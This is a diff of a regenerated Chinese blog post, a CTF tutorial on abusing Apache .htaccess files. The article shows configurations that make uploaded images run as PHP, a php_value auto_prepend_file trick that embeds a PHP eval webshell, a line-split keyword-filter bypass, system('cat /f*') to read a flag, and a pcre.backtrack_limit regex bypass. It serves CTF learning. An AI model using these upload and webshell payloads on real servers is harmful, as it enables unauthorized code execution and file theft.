@@ -22,12 +22,12 @@
 
   
 
-  <title>浅谈ctf中.htaccess配置文件的运用 | luokusng&#39;s blog</title>
+  <title>浅谈ctf中.htaccess配置文件的运用 | luokuang&#39;s blog</title>
 
   
 
   
-    <link rel="shortcut icon" href="/luo.ico">
+    <link rel="shortcut icon" href="/favicon.ico">
   
 
   <!--mathjax latex数学公式显示支持-->
@@ -46,6 +46,7 @@
   
 <link rel="stylesheet" href="/css/style.css">
 
+<!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload="this.media='all'"><script src="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><!-- hexo injector head_end end --><link rel="alternate" href="/atom.xml" title="luokuang's blog" type="application/atom+xml">
 </head>
 <body>
   <div class="root-container">
@@ -63,7 +64,7 @@
     <div class="navbar-logo">
       <a href="/">
         
-          luokusng&#39;s blog
+          luokuang&#39;s blog
         
       </a>
     </div>
@@ -78,7 +79,7 @@
         
           <li class="navbar-list-item"><a href="/">首页</a></li>
         
-          <li class="navbar-list-item"><a href="/links/%7C%7C%20link">友链</a></li>
+          <li class="navbar-list-item"><a href="/links">友链</a></li>
         
           <li class="navbar-list-item"><a href="/about">关于</a></li>
         
@@ -149,7 +150,7 @@
       
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
         <p>相关的文章为：<a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/116666720">https://blog.csdn.net/solitudi/article/details/116666720</a></p>
-<h3 id="htaccess配置文件的基本信息"><a href="#htaccess配置文件的基本信息" class="headerlink" title=".htaccess配置文件的基本信息"></a>.htaccess配置文件的基本信息</h3><p>首先先了解一下有关.htaccess文件是什么，是一个配置文件，用于运行Apache网络服务器软件的网络服务器上，当.htaccess文件被放置在一个 “通过Apache Web服务器加载 “的目录中时，.htaccess文件会被Apache Web服务器软件检测并执行。这些.htaccess文件可以用来改变Apache Web服务器软件的配置，以启用&#x2F;禁用Apache Web服务器软件所提供的额外功能和特性。 简单来说就是用来修改配置的</p>
+<h3 id="htaccess配置文件的基本信息"><a href="#htaccess配置文件的基本信息" class="headerlink" title=".htaccess配置文件的基本信息"></a>.htaccess配置文件的基本信息</h3><p>首先先了解一下有关.htaccess文件是什么，是一个配置文件，用于运行Apache网络服务器软件的网络服务器上，当.htaccess文件被放置在一个 “通过Apache Web服务器加载 “的目录中时，.htaccess文件会被Apache Web服务器软件检测并执行。这些.htaccess文件可以用来改变Apache Web服务器软件的配置，以启用/禁用Apache Web服务器软件所提供的额外功能和特性。 简单来说就是用来修改配置的</p>
 <p>然后补充一点就是在.htaccess配置文件中单行注释符为 # </p>
 <p>如果想要在服务器上可以运行.htaccess文件就需要先将主配置文件的AllowOverride 设置为 All</p>
 <h3 id="具体的运用"><a href="#具体的运用" class="headerlink" title="具体的运用"></a>具体的运用</h3><h4 id="通过-htaccess文件来制定出错页面"><a href="#通过-htaccess文件来制定出错页面" class="headerlink" title="通过.htaccess文件来制定出错页面"></a>通过.htaccess文件来制定出错页面</h4><blockquote>
@@ -159,7 +160,7 @@
 <blockquote>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;If <span class="string">&quot;file(&#x27;/flag&#x27;) =~ &#x27;/flag&#123;a/&#x27;&quot;</span>&gt;  <span class="comment">//~ 类似为正则匹对</span></span><br><span class="line">ErrorDocument <span class="number">404</span> <span class="string">&quot;y4tacker&quot;</span></span><br><span class="line">&lt;/If&gt;</span><br></pre></td></tr></table></figure>
 </blockquote>
-<p>如果在&#x2F;flag中有flag{a 就返回y4tacker，从而来枚举出flag,比较少用</p>
+<p>如果在/flag中有flag{a 就返回y4tacker，从而来枚举出flag,比较少用</p>
 <h4 id="SetHandler和ForceType"><a href="#SetHandler和ForceType" class="headerlink" title="SetHandler和ForceType"></a>SetHandler和ForceType</h4><p>常见的应用场景 文件上传：</p>
 <blockquote>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;1.jpg&quot;</span>&gt;   <span class="comment">//指定将1.jpg通过PHP运行</span></span><br><span class="line">SetHandler application/x-httpd-php  </span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"><span class="comment">//或者直接全局都直接使用PHP解析</span></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"></span><br><span class="line">&lt;Files ~ <span class="string">&quot;\.jpg$&quot;</span>&gt;   <span class="comment">//~先当于正则匹对 将所有匹对到.jpg结尾的都以PHP解析</span></span><br><span class="line"> ForceType application/x-httpd-php  </span><br><span class="line">&lt;/Files&gt;</span><br></pre></td></tr></table></figure>
@@ -172,14 +173,14 @@
 <blockquote>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .html</span><br></pre></td></tr></table></figure>
 </blockquote>
-<p>这条指令告诉Apache服务器，当遇到.html扩展名的文件时，应该将它们视为application&#x2F;x-httpd-php类型的文件，即PHP脚本文件，并由PHP解析器进行处理</p>
+<p>这条指令告诉Apache服务器，当遇到.html扩展名的文件时，应该将它们视为application/x-httpd-php类型的文件，即PHP脚本文件，并由PHP解析器进行处理</p>
 <h4 id="php-value"><a href="#php-value" class="headerlink" title="php_value"></a>php_value</h4><p>当使用 PHP 作为 Apache 模块时，也可以用 Apache 的配置文件（例如 httpd.conf）和 .htaccess  文件中的指令来修改 php 的配置设定。需要有AllowOverride Options 或AllowOverride All 权限才可以</p>
 <p>php_value 设定指定的值。要清除先前设定的值，把 value 设为 none。不要用 php_value 设定布尔值。应该用 php_flag</p>
 <p>实际的应用中就有：</p>
 <blockquote>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_file <span class="number">1</span>.txt <span class="comment">//在主文件解析之前自动解析包含1.txt的内容</span></span><br><span class="line">php_value auto_append_file <span class="number">2</span>.txt <span class="comment">//在主文件解析后自动解析1.txt的内容</span></span><br><span class="line"><span class="comment">//最好是这样，应用#号为注释符，但是PHP可以正常解析来上传一句话木马</span></span><br><span class="line">php_value auto_prepend_file .htaccess <span class="comment">#&lt;?php @eval($_POST[&#x27;a&#x27;]);?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//关于过滤file： 这样也是可以执行命令的</span></span><br><span class="line">php_value auto_prepend_fi\</span><br><span class="line">le .htaccess</span><br><span class="line"><span class="comment">#&lt;?php phpinfo();</span></span><br></pre></td></tr></table></figure>
 </blockquote>
-<p>还有一种用法，绕过preg_match匹对，将最大的次数改为0即可，就可以用最大回溯(pcre.backtrack_limit)&#x2F;递归限制使php正则失效：</p>
+<p>还有一种用法，绕过preg_match匹对，将最大的次数改为0即可，就可以用最大回溯(pcre.backtrack_limit)/递归限制使php正则失效：</p>
 <blockquote>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value pcre.backtrack_limit <span class="number">1</span>  <span class="comment">//默认为100000</span></span><br></pre></td></tr></table></figure>
 </blockquote>
@@ -191,13 +192,13 @@
 <p>看逻辑应该是在删除后再创建的文件，但是上传一个普通的php文件，发现上传什么都没有用，无论怎么上传，页面都只是显示Hello, world</p>
 <p>这里就可以通过上传.htaccess来修改配置</p>
 <blockquote>
-<p>php_value auto_prepend_file .htaccess<br>#<?php system('cat /f*');?></p>
-</blockquote>
+<p>php_value auto_prepend_file .htaccess</p>
+<h1 id="lt-php-system-‘cat-f-’-gt"><a href="#lt-php-system-‘cat-f-’-gt" class="headerlink" title="&lt;?php system(‘cat /f*’);?&gt;"></a>&lt;?php system(‘cat /f*’);?&gt;</h1></blockquote>
 <p>但是需要有些修改，还有要将后面的\nHello, world继续拼接否则回报错</p>
 <p>这里过滤了file 可以通过变为</p>
 <blockquote>
-<p>php_value auto_prepend_fil<br>e .htaccess<br>#<?php system('cat /f*');?>\</p>
-</blockquote>
+<p>php_value auto_prepend_fil\<br>e .htaccess</p>
+<h1 id="lt-php-system-‘cat-f-’-gt-1"><a href="#lt-php-system-‘cat-f-’-gt-1" class="headerlink" title="&lt;?php system(‘cat /f*’);?&gt;\"></a>&lt;?php system(‘cat /f*’);?&gt;\</h1></blockquote>
 <p>最后再通过url编码上传即可</p>
 <p>最后payload为：</p>
 <blockquote>
@@ -245,13 +246,13 @@
       <section class="widget-author widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
   <div class="widget-body">
     
-      <img src="https://s.gravatar.com/avatar/2d6b803eea37de0257620d5fabee7e64?s=200&amp;r=g&amp;d=retro" class="soft-size--round soft-style--box" alt="luokuang">
+      <img src="https://s.gravatar.com/avatar/2d6b803eea37de0257620d5fabee7e64?s=200&amp;r=g&amp;d=retro" class="soft-size--round soft-style--box" alt="Sukoshi">
     
     
-      <h2>luokuang</h2>
+      <h2>Sukoshi</h2>
     
     
-      <p>不想当码农，所有选安全</p>
+      <p>贵在坚持</p>
     
 
     <div class="count-box">
@@ -288,7 +289,7 @@
     <span>NOTICE</span>
   </div>
   <div class="widget-body">
-    <p>本人实力有限，如果有不对的还请见谅</p>
+    <p>flex-block主题部分重构，详情查看https://github.com/miiiku/flex-block</p>
   </div>
 </section>
 
@@ -431,5 +432,5 @@
 
   
   <!-- 尾部用户自定义相关内容 -->
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+<!-- hexo injector body_end start --><script async src="//at.alicdn.com/t/font_2032782_8d5kxvn09md.js"></script><!-- hexo injector body_end end --><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
 </html>
